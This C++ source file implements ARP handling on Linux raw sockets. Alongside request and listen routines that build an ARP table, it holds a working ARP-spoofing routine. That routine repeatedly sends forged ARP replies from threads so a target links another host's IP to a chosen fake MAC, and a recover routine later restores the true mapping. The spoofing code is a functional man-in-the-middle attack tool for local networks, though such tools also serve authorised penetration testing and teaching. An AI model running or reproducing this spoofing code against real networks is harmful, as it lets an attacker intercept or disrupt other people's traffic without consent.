#include "models/arp.hpp"
#include "utils/thread_utils.hpp"
#include "utils/socket_utils.hpp"
#include "utils/mac_utils.hpp"

#include <iostream>
#include <chrono>
#include <thread>
#include <functional>
#include <atomic>

#include <string.h>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <arpa/inet.h>

typedef std::chrono::high_resolution_clock Clock;

ARP::ARP(const Interface &_interface) : interface(_interface) {
    this->sd = Socket::open_socket(interface.get_ip());
    Socket::bind_socket(this->sd, interface.get_name());
}

ARP::ARP() {}

ARP::~ARP() {
    if (Thread::listening_thread[interface.get_ip()].joinable()) {
        Thread::listen_signal[interface.get_ip()].store(false, std::memory_order_relaxed);
        Thread::listening_thread[interface.get_ip()].join();
    }
}

struct sockaddr_ll ARP::prepare_arp(unsigned char *buffer, const uint32_t &dst_ip, Operation op, const std::string &dst_mac, const uint32_t &src_ip, const std::string &src_mac) const {
    memset(buffer, 0, BUF_SIZE);
    unsigned char mac_address[MAC_LENGTH];

    struct sockaddr_ll socket_address;
    socket_address.sll_family = AF_PACKET;
    socket_address.sll_protocol = htons(ETH_P_ARP);
    socket_address.sll_ifindex = Socket::get_interface_index(sd, interface.get_name());
    socket_address.sll_hatype = htons(ARPHRD_ETHER);
    socket_address.sll_pkttype = PACKET_BROADCAST;
    socket_address.sll_halen = MAC_LENGTH;
    socket_address.sll_addr[6] = 0x00;
    socket_address.sll_addr[7] = 0x00;

    struct ethhdr *send_req = (struct ethhdr *)buffer;
    struct arp_header *arp_req = (struct arp_header *)(buffer + ETH2_HEADER_LEN);

    // fill dst mac
    if (op == Operation::REQUEST) {
        //Broadcast
        memset(send_req->h_dest, 0xff, MAC_LENGTH);
        //Target MAC zero
        memset(arp_req->target_mac, 0x00, MAC_LENGTH);
    } else {
        Mac::string_mac_to_byte(mac_address, dst_mac);
        memcpy(send_req->h_dest, mac_address, MAC_LENGTH);
        memcpy(arp_req->target_mac, mac_address, MAC_LENGTH);
    }

    // fill src mac
    if (op == Operation::REQUEST) {
        std::string interface_mac_address = Mac::get_interface_mac_address(sd, interface.get_name());
        Mac::string_mac_to_byte(mac_address, interface_mac_address);
    } else {
        Mac::string_mac_to_byte(mac_address, src_mac);
    }
    memcpy(send_req->h_source, mac_address, MAC_LENGTH);
    memcpy(arp_req->sender_mac, mac_address, MAC_LENGTH);
    memcpy(socket_address.sll_addr, mac_address, MAC_LENGTH);

    send_req->h_proto = htons(ETH_P_ARP);

    arp_req->hardware_type = htons(HW_TYPE);
    arp_req->protocol_type = htons(ETH_P_IP);
    arp_req->hardware_len = MAC_LENGTH;
    arp_req->protocol_len = IPV4_LENGTH;
    arp_req->opcode = htons(op == Operation::REQUEST ? ARP_REQUEST : ARP_REPLY);

    memcpy(arp_req->sender_ip, &src_ip, sizeof(uint32_t));
    memcpy(arp_req->target_ip, &dst_ip, sizeof(uint32_t));

    return socket_address;
}

void ARP::_listen(std::map<std::string, std::string> &arp_table) const {
    unsigned char buffer[BUF_SIZE];
    while (Thread::listen_signal[interface.get_ip()].load(std::memory_order_relaxed)) {
        ssize_t recv_len = recvfrom(sd, buffer, BUF_SIZE, 0, NULL, NULL);
        if (recv_len == -1) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                errno = 0;
                continue;
            } else {
                std::cerr << "_listen: Failed to receive packet.\n";
                return;
            }
        }

        struct ethhdr *rcv_resp = (struct ethhdr *)buffer;
        struct arp_header *arp_resp = (struct arp_header *)(buffer + ETH2_HEADER_LEN);

        if (ntohs(rcv_resp->h_proto) != PROTO_ARP) {
            continue;
        }

        if (ntohs(arp_resp->opcode) != ARP_REPLY) {
            continue;
        }

        struct in_addr sender_addr;
        memset(&sender_addr, 0, sizeof(struct in_addr));
        memcpy(&sender_addr.s_addr, arp_resp->sender_ip, sizeof(uint32_t));
        std::string sender_ip = std::string(inet_ntoa(sender_addr));
        std::string sender_mac = Mac::byte_mac_to_string(arp_resp->sender_mac);

        arp_table[sender_ip] = sender_mac;
    }
}

void ARP::listen(std::map<std::string, std::string> &arp_table) const {
    Thread::listen_signal[interface.get_ip()].store(true, std::memory_order_relaxed);
    Thread::listening_thread[interface.get_ip()] = std::thread(&ARP::_listen, this, std::ref(arp_table));
}

void ARP::_spoof(const Host &target, const std::string &spoof_src_ip, const int sd, const int attack_interval_ms, const std::string &fake_mac_address) const {
    unsigned char buffer[BUF_SIZE];
    std::string target_ip = target.get_ip();
    uint32_t src_ip = inet_addr(spoof_src_ip.c_str());
    uint32_t dst_ip = inet_addr(target_ip.c_str());
    struct sockaddr_ll socket_address = prepare_arp(buffer, dst_ip, Operation::SPOOF, target.get_mac(), src_ip, fake_mac_address);

    auto last_attack_time = Clock::now(); // let auto determine the type
    last_attack_time = {}; // then clear the time_point

    while (Thread::spoof_signal[target_ip][spoof_src_ip].load(std::memory_order_relaxed)) {
        auto current_time = Clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(current_time - last_attack_time).count();
        if (duration < attack_interval_ms) {
            continue; // wait for some amount of time before the next spoofing packet.
        }

        if (sendto(sd, buffer, 42, 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) == -1) {
            std::cerr << "_spoof: Failed to send spoof packet.\n";
        }

        last_attack_time = current_time;
    }
}

void ARP::request(const std::string &target_ip) const {
    unsigned char buffer[BUF_SIZE];
    uint32_t dst_ip = inet_addr(target_ip.c_str());
    struct sockaddr_ll socket_address = prepare_arp(buffer, dst_ip);

    if (sendto(sd, buffer, 42, 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) == -1) {
        std::cerr << "request: Failed to send arp request.\n";
    }
}

void ARP::spoof(const Host &target, const Host &spoof_src, const int attack_interval_ms, const std::string &fake_mac_address) const {
    std::string spoof_src_ip = spoof_src.get_ip();
    Thread::spoof_signal[target.get_ip()][spoof_src_ip].store(true, std::memory_order_relaxed);
    Thread::spoof_thread[target.get_ip()][spoof_src_ip] = std::thread(&ARP::_spoof, this, target, spoof_src_ip, sd, attack_interval_ms, fake_mac_address);
}

void ARP::recover(const Host &target, const Host &spoof_src) const {
    std::string target_ip = target.get_ip();
    std::string spoof_src_ip = spoof_src.get_ip();

    if (Thread::stop_thread(target_ip, spoof_src_ip)) {
        unsigned char buffer[BUF_SIZE];
        uint32_t dst_ip = inet_addr(target_ip.c_str());
        uint32_t src_ip = inet_addr(spoof_src_ip.c_str());
        struct sockaddr_ll socket_address = prepare_arp(buffer, dst_ip, Operation::RECOVER, target.get_mac(), src_ip, spoof_src.get_mac());
        if (sendto(sd, buffer, 42, 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) == -1) {
            std::cerr << "recover: Failed to send recover packet.\n";
        }
    }
}